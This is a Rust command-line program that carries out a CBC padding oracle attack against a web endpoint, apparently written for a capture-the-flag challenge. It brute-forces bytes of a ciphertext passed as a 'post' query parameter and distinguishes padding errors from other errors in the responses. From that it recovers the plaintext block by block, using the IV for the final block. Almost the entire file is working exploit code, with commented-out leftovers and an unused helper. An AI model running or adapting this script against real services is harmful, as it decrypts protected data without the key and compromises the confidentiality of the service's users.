use anyhow::{Result, *};
use base64::{prelude::BASE64_STANDARD, Engine};
use clap::Parser;
use reqwest::{blocking::Client, Url};
use std::io::{self, Write};

#[derive(Debug, Parser)]
#[command(version, about, long_about = None)]
struct Args {
    url: Url,
    #[arg(long = "ciphertext")]
    base64: String,
    #[arg(short, long)]
    iv: Option<String>,
}

fn main() -> Result<()> {
    let args = Args::parse();

    println!("{args:#?}");

    let mut chunks: Vec<Vec<u8>> = BASE64_STANDARD
        .decode(
            args.base64
                .replace('~', "=")
                .replace('!', "/")
                .replace('-', "+"),
        )?
        .chunks(16)
        .map(|chunk| chunk.to_vec())
        .collect();

    let client = Client::new();
    //chunks.iter().for_each(|chunk| println!("{chunk:x?}"));
    let orig_chunks = chunks.clone();
    let len = chunks.len();
    let mut intermediates = [0u8; 16];
    let mut plaintext: Vec<Vec<u8>> = vec![];

    for chunk in 2..=9 {
        let mut intermediates = [0u8; 16];
        chunks = orig_chunks.clone();
        for i in 1u8..=16 {
            println!("chunk: #{}", len - chunk);
            println!("i: {i}");

            for b in 0u8..=255 {
                {
                    let second_last = chunks.get_mut(len - chunk).unwrap();
                    second_last[16 - i as usize] = b;
                }
                // println!(
                //     "{:x?}",
                //     chunks
                //         .clone()
                //         .into_iter()
                //         .skip(8)
                //         .flatten()
                //         .collect::<Vec<_>>()
                // );
                let encoded = BASE64_STANDARD
                    .encode(
                        chunks
                            .clone()
                            .into_iter()
                            .skip(len - chunk)
                            .take(2)
                            .flatten()
                            .collect::<Vec<_>>(),
                    )
                    .replace('=', "~")
                    .replace('/', "!")
                    .replace('+', "-");

                let res = client
                    .get(args.url.as_str())
                    .query(&[("post", encoded)])
                    .send()?;
                let text = res.text()?;
                if text.contains("PaddingException") {
                    print!("{b} ");
                    io::stdout().flush().unwrap();
                } else {
                    println!("\n{b} {text}");
                    if text.contains("UnicodeDecodeError") || text.contains("ValueError") || i != 1
                    {
                        intermediates[16 - i as usize] = b ^ i;
                        let second_last = chunks.get_mut(len - chunk).unwrap();
                        println!("{second_last:x?}");
                        for x in 1..=i {
                            second_last[16 - x as usize] = intermediates[16 - x as usize] ^ (i + 1);
                        }
                        println!("{second_last:x?}");
                        break;
                    }
                }
                if b == 255 {
                    panic!()
                }
            }
        }

        println!("{:x?}", intermediates);
        let newplaintext: Vec<u8> = intermediates
            .iter()
            .zip(orig_chunks.get(len - chunk).unwrap().iter())
            .map(|(&x1, &x2)| x1 ^ x2)
            .collect();
        plaintext.push(newplaintext);
        println!("{:#?}", plaintext);

        //  XOR intermediates but like with a .map
        // and then print it in ascii or something
        // thank you

        // for n in (0..15).rev() {
        //     block3 = [0; 16];
        //     for x in 0x0..0xFF {
        //         block3[n] = x;
        //         let package = make_package(&block3, block4);
        //         let res = client
        //             .get(url.as_str())
        //             .query(&[("post", package)])
        //             .send()?;
        //         println!("{:#?}", res.text());
        //     }
        // }

        if chunk == 9 {
            if let Some(iv) = &args.iv {
                let mut iv = BASE64_STANDARD
                    .decode(iv.replace('~', "=").replace('!', "/").replace('-', "+"))?;

                iv.iter_mut()
                    .zip(intermediates.iter())
                    .for_each(|(x1, x2)| *x1 ^= *x2);

                plaintext.push(iv);
                plaintext.reverse();
                println!("{}", String::from_utf8(plaintext.concat())?);
            }
        }
    }

    // plaintext.reverse();
    // println!("{}", String::from_utf8(plaintext.concat())?);

    Ok(())
}

fn make_package(block3: &[u8], block4: &[u8]) -> String {
    BASE64_STANDARD
        .encode([block3, block4].concat())
        .replace('=', "~")
        .replace('/', "!")
        .replace('+', "-")
}
